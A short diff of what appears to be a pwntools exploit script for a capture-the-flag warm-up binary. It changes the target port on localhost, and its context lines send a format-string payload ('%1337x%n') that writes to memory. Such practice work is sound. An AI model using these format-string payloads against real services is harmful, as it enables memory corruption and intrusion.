@@ -7,7 +7,7 @@ import sys
 if len(sys.argv) == 1:
     r = process("./warm-up-1")
 else:
-    r = remote("127.0.0.1", 1337)
+    r = remote("127.0.0.1", 1004)
 
 payload = str("%1337x%n")
 r.sendlineafter("Nama Kamu Siapa?\n", payload, timeout=3)
